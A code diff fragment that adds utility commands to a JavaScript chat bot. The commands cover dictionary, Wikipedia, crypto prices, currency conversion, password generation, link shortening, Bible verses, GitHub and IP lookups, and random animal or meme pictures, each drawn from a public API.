+    await sendButtons(ctx, { body: `🧠 ${f.text}`, title: 'Did you know?', buttons: [{ label: '🔁 Another fact', cmd: 'fact' }, { label: '😂 Joke', cmd: 'joke' }, { label: '📋 Menu', cmd: 'menu' }] });
+  });
+
+  def(['define', 'dict'], { cat: 'tools', usage: 'define <word>', desc: 'English dictionary: meaning, part of speech and an example.' }, async ctx => {
+    const w = ctx.input().trim().split(/\s+/)[0];
+    if (!w) throw new UserError(`Usage: *${ctx.var('PREFIX')}define serendipity*`);
+    let d;
+    try { d = await U.getJson('https://api.dictionaryapi.dev/api/v2/entries/en/' + encodeURIComponent(w.toLowerCase()), { timeout: 9000 }); }
+    catch (e) { if (/HTTP 404/.test(e.message)) throw new UserError(`No definition found for *${w}*.`); throw e; }
+    const e = d?.[0];
+    if (!e) throw new UserError(`No definition found for *${w}*.`);
+    const out = (e.meanings || []).slice(0, 3).map(m => {
+      const df = m.definitions?.[0];
+      return `${bold(m.partOfSpeech || '')}\n${df?.definition || ''}${df?.example ? `\n_e.g. ${df.example}_` : ''}`;
+    });
+    await ctx.reply(`${bold(e.word)}${e.phonetic ? `  ${e.phonetic}` : ''}\n\n${out.join('\n\n')}`, { title: 'Dictionary' });
+  });
+
+  def(['wiki', 'wikipedia'], { cat: 'tools', heavy: true, usage: 'wiki <topic>', desc: 'Short Wikipedia summary of a topic.' }, async ctx => {
+    const t = ctx.input().trim();
+    if (!t) throw new UserError(`Usage: *${ctx.var('PREFIX')}wiki Nairobi*`);
+    const s = await U.getJson(`https://en.wikipedia.org/w/rest.php/v1/search/title?q=${encodeURIComponent(t)}&limit=1`, { timeout: 9000 });
+    const hit = s?.pages?.[0];
+    if (!hit) throw new UserError(`Nothing found on Wikipedia for *${t}*.`);
+    const p = await U.getJson(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(hit.key)}`, { timeout: 9000 });
+    const text = String(p.extract || '').slice(0, 900);
+    if (!text) throw new UserError(`Nothing found on Wikipedia for *${t}*.`);
+    await ctx.reply(`${bold(p.title || hit.title)}\n\n${text}${p.extract.length > 900 ? '…' : ''}\n\n🔗 ${p.content_urls?.mobile?.page || p.content_urls?.desktop?.page || ''}`, { title: 'Wikipedia' });
+  });
+
+  def(['crypto', 'coin', 'price'], { cat: 'tools', usage: 'crypto <coin>  e.g. crypto btc eth', desc: 'Live crypto price in USD and KES with the 24h change (up to 5 coins).' }, async ctx => {
+    const list = (ctx.argv.length ? ctx.argv : ['btc', 'eth']).slice(0, 5).map(c => COINS[c.toLowerCase()] || c.toLowerCase().replace(/[^a-z0-9-]/g, ''));
+    const d = await U.getJson(`https://api.coingecko.com/api/v3/simple/price?ids=${list.join(',')}&vs_currencies=usd,kes&include_24hr_change=true`, { timeout: 10000 });
+    const rows = list.filter(id => d?.[id]?.usd !== undefined).map(id => {
+      const x = d[id], ch = x.usd_24h_change;
+      return `${ch >= 0 ? '🟢' : '🔴'} ${bold(id.toUpperCase())}\n$${money(x.usd)}  •  KES ${money(x.kes)}${typeof ch === 'number' ? `  •  ${ch >= 0 ? '+' : ''}${ch.toFixed(2)}% (24h)` : ''}`;
+    });
+    if (!rows.length) throw new UserError(`Coin not found. Try codes like btc, eth, sol, bnb, xrp, doge.`);
+    await ctx.reply(rows.join('\n\n'), { title: 'Crypto prices' });
+  });
+
+  def(['convert', 'currency', 'fx'], { cat: 'tools', usage: 'convert 100 usd kes', desc: 'Convert between currencies using current exchange rates.' }, async ctx => {
+    const m = ctx.args.match(/^([\d.,]+)\s*([a-zA-Z]{3})\s*(?:to|in|->)?\s*([a-zA-Z]{3})$/i);
+    if (!m) throw new UserError(`Usage: *${ctx.var('PREFIX')}convert 100 usd kes*`);
+    const amount = Number(m[1].replace(/,/g, '')), from = m[2].toUpperCase(), to = m[3].toUpperCase();
+    if (!Number.isFinite(amount)) throw new UserError('That amount is not a valid number.');
+    const r = await getRates();
+    if (!r[from] || !r[to]) throw new UserError(`Unknown currency. Use 3-letter codes such as USD, KES, EUR, GBP.`);
+    const out = amount / r[from] * r[to];
+    await ctx.reply(`💱 ${bold(amount.toLocaleString('en-US'))} ${from} = ${bold(out.toLocaleString('en-US', { maximumFractionDigits: 2 }))} ${to}\n1 ${from} = ${(r[to] / r[from]).toLocaleString('en-US', { maximumFractionDigits: 4 })} ${to}`, { title: 'Currency' });
+  });
+
+  def(['password', 'genpass'], { cat: 'tools', usage: 'password [length 8-64]', desc: 'Generate a strong random password.' }, async ctx => {
+    const n = Math.min(64, Math.max(8, parseInt(ctx.argv[0], 10) || 16));
+    const set = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%&*?';
+    let pw = '';
+    for (let i = 0; i < n; i++) pw += set[crypto.randomInt(set.length)];
+    await ctx.reply(`🔐 \`\`\`${pw}\`\`\`\nGenerated locally. Delete this message after copying it.`, { title: 'Password' });
+  });
+
+  def(['short', 'shorten'], { cat: 'tools', usage: 'short <link>', desc: 'Shorten a long link.' }, async ctx => {
+    const url = ctx.input().trim().split(/\s+/)[0];
+    if (!/^https?:\/\/\S+$/i.test(url)) throw new UserError(`Usage: *${ctx.var('PREFIX')}short https://example.com/very/long/link*`);
+    const out = String(await U.getText('https://tinyurl.com/api-create.php?url=' + encodeURIComponent(url), { timeout: 10000 })).trim();
+    if (!/^https?:\/\//.test(out)) throw new UserError('The link could not be shortened.');
+    await ctx.reply(`🔗 ${out}`, { title: 'Short link' });
+  });
+
+  def(['verse', 'bible'], { cat: 'tools', usage: 'verse [reference]  e.g. verse john 3:16', desc: 'Bible verse by reference, or a random verse.' }, async ctx => {
+    const ref = ctx.input().trim() || 'random';
+    const d = await U.getJson(`https://bible-api.com/${encodeURIComponent(ref)}${ref === 'random' ? '' : '?translation=kjv'}`, { timeout: 10000 }).catch(e => { if (/HTTP 404/.test(e.message)) throw new UserError(`Verse not found. Try *${ctx.var('PREFIX')}verse john 3:16*`); throw e; });
+    if (!d?.text) throw new UserError('No verse came back. Try again.');
+    await ctx.reply(`📖 ${bold(d.reference || ref)}\n\n${String(d.text).trim()}\n\n_${d.translation_name || 'KJV'}_`, { title: 'Bible' });
+  });
+
+  def(['github', 'gh'], { cat: 'tools', usage: 'github <username>', desc: 'GitHub profile summary.' }, async ctx => {
+    const u = ctx.argv[0];
+    if (!u || !/^[\w-]{1,39}$/.test(u)) throw new UserError(`Usage: *${ctx.var('PREFIX')}github octocat*`);
+    const d = await U.getJson('https://api.github.com/users/' + u, { timeout: 10000 }).catch(e => { if (/HTTP 404/.test(e.message)) throw new UserError('GitHub user not found.'); throw e; });
+    const text = `👤 ${bold(d.name || d.login)} (@${d.login})\n${d.bio ? d.bio + '\n' : ''}\n📦 Repos: ${d.public_repos}   👥 Followers: ${d.followers}   ➡️ Following: ${d.following}${d.location ? `\n📍 ${d.location}` : ''}${d.blog ? `\n🌐 ${d.blog}` : ''}\n🔗 ${d.html_url}`;
+    await ctx.reply(text, { title: 'GitHub' });
+  });
+
+  def(['ipinfo', 'ip'], { cat: 'tools', usage: 'ipinfo <ip or domain>', desc: 'Where an IP address or domain is located.' }, async ctx => {
+    const q = ctx.argv[0];
+    if (!q || !/^[\w.:-]{3,100}$/.test(q)) throw new UserError(`Usage: *${ctx.var('PREFIX')}ipinfo 8.8.8.8*`);
+    const d = await U.getJson('https://ipwho.is/' + encodeURIComponent(q), { timeout: 10000 });
+    if (!d?.success) throw new UserError('Could not look that up. Check the address.');
+    await ctx.reply(`🌐 ${bold(d.ip)}\n📍 ${[d.city, d.region, d.country].filter(Boolean).join(', ')} ${d.flag?.emoji || ''}\n🏢 ${d.connection?.org || d.connection?.isp || 'n/a'}\n🕒 ${d.timezone?.id || 'n/a'}`, { title: 'IP lookup' });
+  });
+
+  const pic = (names, url, key, label) => def(names, { cat: 'tools', desc: `A random ${label} picture.` }, async ctx => {
+    const j = await U.getJson(url, { timeout: 10000 });
+    const link = key(j);
+    if (!link) throw new UserError('No picture came back. Try again.');
+    const buf = await U.http(link, { timeout: 20000, maxBytes: 8 * 1024 * 1024 });
+    await ctx.image(buf, `🖼️ ${label}`);
+  });
+  pic(['catpic', 'kitty'], 'https://api.thecatapi.com/v1/images/search', j => j?.[0]?.url, 'cat');
+  pic(['dogpic', 'puppy'], 'https://dog.ceo/api/breeds/image/random', j => j?.message, 'dog');
+  pic(['meme'], 'https://meme-api.com/gimme', j => (j?.nsfw ? null : j?.url), 'meme');
+};
